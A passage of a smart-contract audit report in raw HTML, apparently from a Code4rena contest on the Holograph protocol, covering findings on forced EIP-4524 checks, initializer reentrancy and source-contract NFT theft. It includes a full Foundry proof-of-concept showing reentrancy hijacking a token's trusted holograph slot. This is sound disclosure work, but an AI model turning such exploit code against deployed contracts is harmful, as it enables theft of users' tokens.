class=\"grvsc-line\"><span class=\"grvsc-source\">_transfer(account, recipient, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">require(_checkOnERC20Received(account, recipient, amount, data), &quot;ERC20: non ERC20Receiver&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_isEventRegistered(HolographERC20Event.afterSafeTransfer)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  require(SourceERC20().afterSafeTransfer(account, recipient, amount, data));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The checkOnERC20Received function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_isContract(recipient)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  try ERC165(recipient).supportsInterface(ERC165.supportsInterface.selector) returns (bool erc165support) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(erc165support, &quot;ERC20: no ERC165 support&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // we have erc165 support</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (ERC165(recipient).supportsInterface(0x534f5876)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // we have eip-4524 support</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      try ERC20Receiver(recipient).onERC20Received(address(this), account, amount, data) returns (bytes4 retv</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return retval == ERC20Receiver.onERC20Received.selector;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      } catch (bytes memory reason) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (reason.length == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert(&quot;ERC20: non ERC20Receiver&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert(add(32, reason), mload(reason))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert(&quot;ERC20: eip-4524 not supported&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  } catch (bytes memory reason) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (reason.length == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert(&quot;ERC20: no ERC165 support&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert(add(32, reason), mload(reason))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">} else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>In essence, if the target is a contract, the enforcer requires it to fully implement EIP-4524. The problem is that <a href=\"https://eips.ethereum.org/EIPS/eip-4524\">this</a> EIP is just a draft proposal, which the project cannot assume to be supported by any receiver contract, and definitely not every receiver contract.</p>\n<p>The specs warn us:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">⚠️ This EIP is not recommended for general use or implementation as it is likely to change.</span></span></code></pre>\n<p>Therefore, it is a very dangerous requirement to add in an ERC20 enforcer, and must be left to the implementation to do if it so desires.</p>\n<h3 id=\"impact-9\" style=\"position:relative;\"><a href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>ERC20s enforced by HolographERC20 are completely uncomposable. They cannot be used for almost any DeFi application, making it basically useless.</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the EIP-4524 requirements altogether.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1297240122\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Low risk unless this is not a design decision.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1306639824\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Originally a design choice, but it can be updated to not revert if the EIP is not supported.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1306719396\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Will argue that philosophically any code is originally a design choice. If it’s later made clear the choice has unintended dire consequences then the finding should not be penalized because of that alone. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/440#ref-pullrequest-1452472274\">ACC01ADE (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-holographable-tokens-can-be-reinitialized\" style=\"position:relative;\"><a href=\"#m-10-holographable-tokens-can-be-reinitialized\" aria-label=\"m 10 holographable tokens can be reinitialized permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/215\">[M-10] Holographable tokens can be reinitialized</a></h2>\n<p><em>Submitted by securerodd</em></p>\n<p>When new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the <code>HolographFactory</code>, the holograph contract is <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252\">passed in as a parameter</a> to the holographable contract’s initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its <code>_holographSlot</code>.</p>\n<p>However, the initializer is vulnerable to reentrancy and the <code>_holographSlot</code> can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164\">delegate call</a> to a corresponding enforcer contract. From here, the enforcer contract makes an <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241\">optional call</a> to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract’s initialize function before the first one has been completed and overwrite key variables such as the <code>_adminslot</code>, the <code>_holographSlot</code> and the <code>_sourceContractSlot</code>.</p>\n<p>One way in which this becomes problematic is because of how holographed ERC20s perform <code>transferFrom</code> calls. Holographed ERC20s by default allow two special addresses to <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527\">transfer</a> assets on behalf of other users without an allowance. These addresses are calculated by calling <code>_holograph().getBridge()</code> and <code>_holograph().getOperator()</code> respectively. With the above described reentrancy issue, <code>_holograph().getBridge()</code> and <code>_holograph().getOperator()</code> can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept:</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: UNLICENSED</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity ^0.8.13;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;../contracts/HolographFactory.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;../contracts/HolographRegistry.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;../contracts/Holograph.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;../contracts/enforcer/HolographERC20.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">//Contract used to show reentrancy in initializer</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract SourceContract {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address public holographer;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockContract public mc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         mc = new MockContract();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    //function that reenters the holographer and sets this contract as the new holograph slot</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function init(bytes memory initPayload) external returns(bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            sstore(holographer.slot, caller())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32(&quot;0xabc&quot;), address(this)), bytes(&quot;0x0&quot;)); </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        holographer.call(abi.encodeWithSignature(&quot;init(bytes)&quot;, initCode));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return InitializableInterface.init.selector;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getRegistry() external view returns (address) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return address(this);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return address(mc);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function isTheHolograph() external pure returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">//simple extension contract to return easily during reinitialization</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract MockContract {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function init(bytes memory initPayload) external pure returns(bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return InitializableInterface.init.selector;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract HolographTest is Test {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    DeploymentConfig public config;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Verification public verifiedSignature;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    HolographFactory public hf;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    HolographRegistry public hr;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Holograph public h;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    HolographERC20 public he20;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 internal userPrivateKey;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address internal hrAdmin;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mapping(uint256 =&gt; bool) public _burnedTokens;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address internal user;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setUp() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //Creating all of the required objects</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hf = new HolographFactory();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hr = new HolographRegistry();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        h = new Holograph();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        he20 = new HolographERC20();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //Setting up the registry admin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hrAdmin = vm.addr(100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //Creating factory, holograph, and registry init payloads</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory hfInitPayload = abi.encode(address(h), address(hr));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hf.init(hfInitPayload);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        h.init(hInitPayload);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32[] memory reservedTypes = new bytes32[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        reservedTypes[0] = &quot;0xabc&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //Setting up a contract type address for the ERC20 enforcer</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(hrAdmin, hrAdmin);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hr.init(hrInitPayload);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hr.setContractTypeAddress(reservedTypes[0], address(he20));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //Keys used to sign transaction for deployment</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        userPrivateKey = 0x1337;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        user = vm.addr(userPrivateKey);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testDeployShadyHolographer() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //setting up the configuration, contract type is not important</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        config.contractType = &quot;0xabc&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        config.chainType = 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        config.salt = &quot;0x12345&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        config.byteCode = type(SourceContract).creationCode;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory initCode = &quot;0x123&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //giving our token some semi-realistic metadata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        config.initCode = abi.encode(&quot;HToken&quot;, &quot;HT&quot;, uint8(18), uint256(0), &quot;HTdomainSeparator&quot;, &quot;HTdomainVersion&quot;, false, initCode);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //creating the hash for our user to sign</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 hash = keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            abi.encodePacked(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                config.contractType,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                config.chainType,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                config.salt,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                keccak256(config.byteCode),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                keccak256(config.initCode),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //signing the hash and creating the verified signature</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        verifiedSignature.r = r;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        verifiedSignature.v = v;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        verifiedSignature.s = s;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //deploying our new source contract and holographable contract pair</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hf.deployHolographableContract(config, verifiedSignature, user);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //after the reentrancy has affected the initialization, we grab the holographer address from the registry</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider checking whether the contract is in an “initializing” phase such as is done in OpenZeppelin’s <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83\"><code>Initializable</code></a> library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1295226137\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think the enforcer should be considered trusted so the risk here is low.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1306712519\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Good observation. <code>_setInitialized();</code> needs to be moved higher up the stack before the init call.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/215#ref-pullrequest-1452472274\">ACC01ADE (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-source-contract-can-steal-nfts-from-users\" style=\"position:relative;\"><a href=\"#m-11-source-contract-can-steal-nfts-from-users\" aria-label=\"m 11 source contract can steal nfts from users permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/290\">[M-11] Source contract can steal NFTs from users</a></h2>\n<p><em>Submitted by Jeiwan, also found by __141345__ and m9800</em></p>\n<p>A source contract can burn and transfer NFTs of users without their permission.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Every Holographed ERC721 collection is paired with a source contract, which is the user created contract that’s extended by the Holographed ERC721 contract (<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246\">HolographFactory.sol#L234-L246</a>). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users’ NFTs without their approval (<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500\">HolographERC721.sol#L500</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577\">HolographERC721.sol#L577</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sourceBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span 